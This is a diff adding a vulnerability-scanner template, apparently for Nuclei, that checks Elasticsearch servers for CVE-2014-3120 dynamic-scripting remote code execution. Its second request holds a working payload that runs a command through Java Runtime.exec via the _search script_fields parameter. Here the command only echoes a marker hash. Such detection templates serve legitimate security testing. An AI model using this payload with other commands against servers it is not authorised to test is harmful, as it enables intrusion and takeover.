@@ -1,0 +1,48 @@
+id: cve-2014-3120
+
+info:
+  name: Elasticsearch Remote Code Execution (CVE-2014-3120)
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    The default configuration before Elasticsearch 1.2 enabled dynamic scripting, which allowed remote attackers to execute arbitrary MVEL expressions and Java code through the source parameter of _search.
+  reference:
+    - https://github.com/zhzyker
+
+http:
+  - raw:
+      - |
+        POST /website/blog/ HTTP/1.1
+        Host: {{Hostname}}
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+        Connection: close
+        Accept-Language: en
+        Content-Type: application/json
+
+        { "name": "blogsir" }
+    matchers:
+      - type: status
+        status:
+          - 201
+
+  - raw:
+      - |
+        POST /_search?pretty HTTP/1.1
+        Host: {{Hostname}}
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+        Connection: close
+        Accept-Language: en
+        Content-Type: application/json
+
+        {"size":1,"query":{"filtered":{"query":{"match_all":{}}}},"script_fields":{"command":{"script":"import java.io.*;new java.util.Scanner(Runtime.getRuntime().exec(\"echo 0d455d3d2044e6e7781771d932e68dbc\").getInputStream()).useDelimiter(\"\\\\A\").next();"}}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "0d455d3d2044e6e7781771d932e68dbc"
